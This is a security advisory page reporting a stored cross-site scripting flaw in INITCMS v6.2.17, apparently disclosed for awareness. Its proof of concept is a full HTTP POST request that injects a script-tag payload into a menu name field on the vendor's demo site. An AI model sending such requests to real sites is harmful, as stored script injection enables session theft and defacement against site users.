---
title: INITCMS v6.2.17 - Stored Cross-Site Scripting
url: https://cxsecurity.com/issue/WLB-2025090005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-11
fetch_date: 2025-10-02T19:57:15.999980
---

# INITCMS v6.2.17 - Stored Cross-Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **INITCMS v6.2.17 - Stored Cross-Site Scripting** **2025.09.10**  Credit:  **[Osman Aydoğan](https://cxsecurity.com/author/Osman%2BAydo%C4%9Fan/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: INITCMS v6.2.17 - Stored Cross-Site Scripting
# Google Dork: N/A
# Date: 2025-09-06 [YYYY/MM/DD]
# Exploit Author: Osman Aydoğan
# Vendor Homepage: initcms.com
# Vulnerable Software --> [ https://github.com/networking/init-cms-bundle/releases/tag/v6.2.17 ]
# Demo Page: https://demo.initcms.com
# Affected Version: [ v6.2.17 ]
# CVE-ID: N/A
# Tested on: Windows 10
# Vulnerable Parameter Type: POST
# Vulnerable Parameter: http://127.0.0.1/admin-panel-path/index.php?p=admin/actions/entries/save-entry
# Attack Pattern: <script>alert("OsmanXSS")</script>
# Description
Allows it to run a Cross-Site Scripting by saving a new menu from the menus tab.
# Proof of Concepts:
POST /admin/cms/menu/create?uniqid=s68bc9a3f556f3&subclass=menu%20item HTTP/2
Host: demo.initcms.com
Cookie: PHPSESSID=4740579a48b200d5d131481e1c3242b1; \_locale=en
Content-Length: 1430
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: tr-TR,tr;q=0.9
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: application/json, text/plain, \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Origin: https://demo.initcms.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.initcms.com/admin/cms/menu/list
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[name]"
<script>alert("OsmanXSS")</script>
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[locale]"
en
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[page]"
41
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[redirect\_url]"
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[internal\_url]"
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[visibility]"
public
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[link\_target]"
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[link\_class]"
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[link\_rel]"
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[menu]"
40
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf
Content-Disposition: form-data; name="s68bc9a3f556f3[\_token]"
f8a2e368078aad7c0522335.dsUFhXi327vaOMPE1b3x1iUQJR7Fxu1\_jOacFTkBf9Q.OI5gti3648u-a42bt-Kwm3NyZCq3sKYSu4LDJWhsPZkFgHGxKdma9Y1LsA
------WebKitFormBoundaryNAQ1qyfrVjjKL7Xf--

**##### References:**

initcms.com

https://github.com/networking/init-cms-bundle/releases/tag/v6.2.17

https://demo.initcms.com

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top